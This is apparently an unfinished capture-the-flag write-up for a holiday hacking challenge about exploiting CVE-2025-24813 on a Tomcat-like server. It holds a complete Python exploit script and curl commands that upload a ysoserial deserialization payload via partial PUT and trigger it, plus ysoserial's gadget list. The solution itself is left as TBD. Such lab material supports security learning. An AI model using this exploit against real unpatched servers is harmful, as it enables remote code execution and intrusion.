# Snowcat RCE & Priv Esc

## Objective

Difficulty: ❄️ ❄️ ❄️  
[Hints](/docs/HHC_2025/neighborhood/hints/hint-snowcat.md) and [Conversations](/docs/HHC_2025/neighborhood/hints/chat-tom-hessman.md)

Tom, in the hotel, found a wild Snowcat bug. Help him chase down the RCE! Recover and submit the API key not being used by snowcat.

## Solution

TBD

## Detailed Solution

```bash
We've lost control of the Neighborhood Weather Monitoring Station.
We think another system is connecting.

The weather monitoring station uses the Snowcat hosting platform.
It's cousin Tomcat, recently had a Remote Code Execution vulnerability.
Can you help me try and exploit it to regain access to the server?

Once you've gained access, find a way to become the 'weather' user, and find the authorization key used by the other system.
Enter the authorization key used by the other system into the badge.

user@weather:~$ ls 
CVE-2025-24813.py  notes.md  weather-jsps  ysoserial.jar
```

user@weather:~$ cat notes.md 
# Remote Code Execution exploiting RCE-2025-24813

Snowcat is a webserver adapted to life in the arctic.
Can you help me check to see if Snowcat is vulnerable to RCE-2025-24813 like its cousin Tomcat?

## Display ysoserial help, lists payloads, and their dependencies:
```
  java -jar ysoserial.jar
```

## Identify what libraries are used by the Neighborhood Weather Monitoring system

## Use ysoserial to generate a payload

Store payload in file named payload.bin

## Attempt to exploit RCE-2025-24813 to execute the payload

```
export HOST=TODO_INSERT_HOST
export PORT=TODO_INSERT_PORT
export SESSION_ID=TODO_INSERT_SESSION_ID

curl -X PUT \
  -H "Host: ${HOST}:${PORT}" \
  -H "Content-Length: $(wc -c < payload.bin)" \
  -H "Content-Range: bytes 0-$(($(wc -c < payload.bin)-1))/$(wc -c < payload.bin)" \
  --data-binary @payload.bin \
  "http://${HOST}:${PORT}/${SESSION_ID}/session"

curl -X GET \
  -H "Host: ${HOST}:${PORT}" \
  -H "Cookie: JSESSIONID=.${SESSION_ID}" \
  "http://${HOST}:${PORT}/"
```


# Privilege Escalation

The Snowcat server still uses some C binaries from an older system iteration.
Replacing these has been logged as technical debt.
<TOOD_INSERT_ELF_NAME> said he thought these components might create a privilege escalation vulnerability.
Can you prove these components are vulnerable by retrieving the key that is not used by the Snowcat hosted Neighborhood Weather Monitoring Station?

```bash
user@weather:~$ cat CVE-2025-24813.py 
import http.client
import base64
import argparse

def main():
    parser = argparse.ArgumentParser(description="Send serialized session payload via PUT, then trigger via GET.")
    parser.add_argument("--host", required=True, help="Target host, e.g. 192.168.137.132")
    parser.add_argument("--port", type=int, default=8080, help="Target port (default: 8080)")
    parser.add_argument("--base64-payload", required=True, help="Base64-encoded serialized session data")
    parser.add_argument("--session-id", default=".deserialize", help="JSESSIONID value (default: .deserialize)")
    args = parser.parse_args()

    host = args.host
    port = args.port
    session_id = args.session_id

    try:
        payload = base64.b64decode(args.base64_payload)
    except Exception as e:
        print("[!] Failed to decode base64 payload:", e)
        return

    # 1. Send PUT request
    print("[*] Sending PUT request with serialized session data...")
    conn = http.client.HTTPConnection(host, port)
    put_headers = {
        "Host": f"{host}:{port}",
        "Content-Length": str(len(payload)),
        "Content-Range": f"bytes 0-{len(payload)-1}/{len(payload)}"
    }
    conn.request("PUT", f"/{session_id}/session", body=payload, headers=put_headers)
    put_response = conn.getresponse()
    print(f"[PUT] Status: {put_response.status} {put_response.reason}")
    print(put_response.read().decode(errors="ignore"))
    conn.close()

    # 2. Send GET request to trigger deserialization via session
    print("[*] Sending GET request with session cookie...")
    conn = http.client.HTTPConnection(host, port)
    get_headers = {
        "Host": f"{host}:{port}",
        "Cookie": f"JSESSIONID=.{session_id}"
    }
    conn.request("GET", "/", headers=get_headers)
    get_response = conn.getresponse()
    print(f"[GET] Status: {get_response.status} {get_response.reason}")
    print(get_response.read().decode(errors="ignore"))
    conn.close()

if __name__ == "__main__":
    main()
```

```bash
user@weather:~$ ls weather-jsps/
dashboard.jsp  index.jsp  login.jsp
```

Get listening ports to determine the localhost port to use in the exploit

```bash
user@weather:~$ netstat -nlv
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp6       0      0 127.0.0.1:8005          :::*                    LISTEN     
tcp6       0      0 :::80                   :::*                    LISTEN     
netstat: no support for `AF INET (sctp)' on this system.
netstat: no support for `AF INET (sctp)' on this system.
Active UNIX domain sockets (only servers)
Proto RefCnt Flags       Type       State         I-Node   Path
netstat: no support for `AF IPX' on this system.
netstat: no support for `AF AX25' on this system.
netstat: no support for `AF X25' on this system.
netstat: no support for `AF NETROM' on this system.
netstat: no support for `AF ROSE' on this system.
```

step 1 from notes

```bash
user@weather:~$ java -jar ysoserial.jar 
Y SO SERIAL?
Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]'
  Available payload types:
Nov 30, 2025 1:24:06 PM org.reflections.Reflections scan
INFO: Reflections took 399 ms to scan 1 urls, producing 18 keys and 153 values 
     Payload             Authors                                Dependencies                                                                                                                                                                                        
     -------             -------                                ------------                                                                                                                                                                                        
     AspectJWeaver       @Jang                                  aspectjweaver:1.9.2, commons-collections:3.2.2                                                                                                                                                      
     BeanShell1          @pwntester, @cschneider4711            bsh:2.0b5                                                                                                                                                                                           
     C3P0                @mbechler                              c3p0:0.9.5.2, mchange-commons-java:0.2.11                                                                                                                                                           
     Click1              @artsploit                             click-nodeps:2.3.0, javax.servlet-api:3.1.0                                                                                                                                                         
     Clojure             @JackOfMostTrades                      clojure:1.8.0                                                                                                                                                                                       
     CommonsBeanutils1   @frohoff                               commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2                                                                                                                               
     CommonsCollections1 @frohoff                               commons-collections:3.1                                                                                                                                                                             
     CommonsCollections2 @frohoff                               commons-collections4:4.0                                                                                                                                                                            
     CommonsCollections3 @frohoff                               commons-collections:3.1                                                                                                                                                                             
     CommonsCollections4 @frohoff                               commons-collections4:4.0                                                                                                                                                                            
     CommonsCollections5 @matthias_kaiser, @jasinner            commons-collections:3.1                                                                                                                                                                             
     CommonsCollections6 @matthias_kaiser                       commons-collections:3.1                                                                                                                                                                             
     CommonsCollections7 @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1                                                                                                                                                                             
     FileUpload1         @mbechler                              commons-fileupload:1.3.1, commons-io:2.4                                                                                                                                                            
     Groovy1             @frohoff                               groovy:2.3.9                                                                                                                                                                                        
     Hibernate1          @mbechler                                                                                                                                                                                                                                  
     Hibernate2          @mbechler                                                                                                                                                                                                                                  
     JBossInterceptors1  @matthias_kaiser                       javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21                                            
     JRMPClient          @mbechler                                                                                                                                                                                                                                  
     JRMPListener        @mbechler                                                                                                                                                                                                                                  
     JSON1               @mbechler                              json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1
     JavassistWeld1      @matthias_kaiser                       javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21                                                        
     Jdk7u21             @frohoff                                                                                                                                                                                                                                   
     Jython1             @pwntester, @cschneider4711            jython-standalone:2.5.2                                                                                                                                                                             
     MozillaRhino1       @matthias_kaiser                       js:1.7R2                                                                                                                                                                                            
     MozillaRhino2       @_tint0                                js:1.7R2                                                                                                                                                                                            
     Myfaces1            @mbechler                                                                                                                                                                                                                                  
     Myfaces2            @mbechler                                                                                                                                                                                                                                  
     ROME                @mbechler                              rome:1.0                                                                                                                                                                                            
     Spring1             @frohoff                               spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE                                                                                                                                               
     Spring2             @mbechler                              spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2                                                                                                           
     URLDNS              @gebl                                                                                                                                                                                                                                      
     Vaadin1             @kai_ullrich                           vaadin-server:7.7.14, vaadin-shared:7.7.14                                                                                                                                                          
     Wicket1             @jacob-baines                          wicket-util:6.23.0, slf4j-api:1.6.4                                                                                                                                                                 
user@weather:~$ 
```

## Game Location

![alt text](/docs/HHC_2025/neighborhood/Grand_Hotel_Lobby/Netwars/snowcat.png)
